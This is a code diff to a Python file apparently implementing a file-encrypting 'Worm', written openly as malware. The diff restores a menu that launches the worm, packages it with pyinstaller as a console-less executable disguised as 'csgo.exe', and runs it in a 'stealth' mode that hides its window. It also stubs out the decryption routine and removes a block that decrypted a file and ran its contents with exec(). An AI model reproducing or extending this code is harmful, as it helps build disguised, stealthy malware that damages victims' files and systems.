@@ -56,19 +56,16 @@ class Worm:
         pass
 
     def decrypt_data(self, data, filename):
-        with open(filename, "rb") as file:
-            key = file.read(24)
+        pass
+        # with open(filename, "rb") as file:
+        #     key = file.read(24)
 
         # data = base64.b64decode(data)
         # iv = data[:AES.block_size]
         # cipher = AES.new(key, AES.MODE_CFB, iv)
-        # decrypted = cipher.decrypt(data[AES.block_size:])
+        # decrypted = cipher.decrypt(data[16:])
 
-        data = base64.b64decode(data);     
-        iv = Random.new().read(AES.block_size)
-        cipher = AES.new(key, AES.MODE_CFB, iv)
-
-        return cipher.decrypt(data)[16:]
+        # return decrypted
 
     def execute_worm(self):
         if not self.directories_found:
@@ -91,7 +88,7 @@ def worm_menu():
     print('| [+] 1 => Launch Worm            |')
     print('| [+] 2 => Make It Executable     |')
     print('| [+] 3 => Run Worm in Stealth    |')
-    print('| [+] 4 => Decrypt files          |')
+    print('| [+] 4 => Decrypt files(meh)     |')
     print('| [!] 0 => Exit                   |')
     print(' --------------------------------- ')
 
@@ -104,40 +101,34 @@ if __name__ == "__main__":
 
     worm = Worm()
 
-    with open("test.exeHAHAHA", "rb") as f:
-        data = f.read()
+    opt = int
+    while opt != 0:
+        worm_menu()
+        opt = int(input("Operation: "))
+        time.sleep(1)
+        match opt:
+            case 1: # modo normal
+                print("[!] Running Worm!")
+                print('[!] Press [Ctrl] + [C] to Stop!')
+                worm.execute_worm()
+            case 2: # criação de executável
+                print("[+] Creating EXE of Worm!")
+                print('[!] Press [Ctrl] + [C] to Stop!')
+                time.sleep(1)
 
-    e = worm.decrypt_data(data, "test.exeHAHAHA")
-    print(e)
-    exec(e)
-
-    # opt = int
-    # while opt != 0:
-    #     worm_menu()
-    #     opt = int(input("Operation: "))
-    #     time.sleep(1)
-    #     match opt:
-    #         case 1: # modo normal
-    #             print("[!] Running Worm!")
-    #             print('[!] Press [Ctrl] + [C] to Stop!')
-    #             worm.execute_worm()
-    #         case 2: # criação de executável
-    #             print("[+] Creating EXE of Worm!")
-    #             print('[!] Press [Ctrl] + [C] to Stop!')
-    #             time.sleep(1)
-
-    #             os.system("pyinstaller resistencia_exe.py --onefile --noconsole --name csgo")
-    #             print("[!] csgo.exe Created")
-    #         case 3: # modo furtivo
-    #             hide = win32gui.GetForegroundWindow()
-    #             win32gui.ShowWindow(hide, win32con.SW_HIDE)
-    #             worm.execute_worm()
-    #         case 4: # desencriptar ficheiros
-    #             pass
-    #         case 0:
-    #             print("[!] Quitting...")
-    #             time.sleep(1.5)
-    #             break
-    #         case _:
-    #             print("[!] Invalid Option.")
-    #             print("[!] Try again")
+                os.system("pyinstaller resistencia_exe.py --onefile --noconsole --name csgo")
+                print("[!] csgo.exe Created")
+            case 3: # modo furtivo
+                hide = win32gui.GetForegroundWindow()
+                win32gui.ShowWindow(hide, win32con.SW_HIDE)
+                worm.execute_worm()
+            case 4: # desencriptar ficheiros
+                print("doesn't work :( (yet)")
+                pass
+            case 0:
+                print("[!] Quitting...")
+                time.sleep(1.5)
+                break
+            case _:
+                print("[!] Invalid Option.")
+                print("[!] Try again")
